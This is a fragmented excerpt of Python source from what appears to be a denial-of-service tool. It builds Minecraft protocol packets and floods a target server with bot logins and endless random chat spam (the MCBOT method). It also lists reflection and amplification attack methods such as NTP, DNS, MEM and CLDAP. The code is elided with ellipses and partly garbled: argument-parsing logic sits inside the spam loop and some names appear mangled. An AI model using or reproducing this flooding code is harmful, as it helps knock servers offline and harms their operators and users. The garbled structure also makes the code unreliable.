...
class req:
    ...
    def data(*payload: bytes) -> bytes:
        ...
        return req.varint(len(payload)) + payload
    ...
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return req.data(req.varint(0x00),
                              req.varint(version),
                              req.data(target[0].encode()),
                              req.short(target[1]),
                              req.varint(state))
    ...
    def login(protocol: int, username: str) -> bytes:
        ...
        return req.data(req.varint(0x00 if protocol >= 391 else \
    ...
    def keepalive(protocol: int, num_id: int) -> bytes:
        return req.data(req.varint(0x0F if protocol >= 755 else \
                                               ...
                                               0x00),
                              req.long(num_id) if protocol >= 339 else \
                              req.varint(num_id))

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        return req.data(req.varint(0x03 if protocol >= 755 else \
...
class Layer4(Thread):
    ...
    def req(self) -> None:
        handshake = req.handshake(self._target, self.protocolid, 1)
        ping = req.data(b'\x00')
    ...
    def MCBOT(self) -> None:
        ...
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            Tools.send(s, req.handshake_forwarded(self._target,
                                                        self.protocolid,
                                                        2,
            ...
            Tools.send(s, req.login(self.protocolid, username))
            
            sleep(1.5)

            Tools.send(s, req.chat(self.protocolid, "/register %s %s" % (password, password)))
            Tools.send(s, req.chat(self.protocolid, "/login %s" % password))

            while Tools.send(s, req.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
                sleep(1.1)
                ...
                if len(argv) >= 6:
                    ...
                    if argfive:
                        ...
                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
                            ...
                            if method not in {"req", "MCBOT", "TCP", "CPS", "CONNECTION"}:
                                exit("this method cannot use for layer4 proxy")

                        else:
                            logger.setLevel("DEBUG")
                
                protocolid = con["req_DEFAULT_PROTOCOL"]
                
                if method == "MCBOT":
                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                        Tools.send(s, req.handshake((target, port), protocolid, 1))
                        Tools.send(s, req.data(b'\x00'))

                        protocolid = Tools.protocolRex.search(str(s.recv(1024)))
                        protocolid = con["req_DEFAULT_PROTOCOL"] if not protocolid else int(protocolid.group(1))
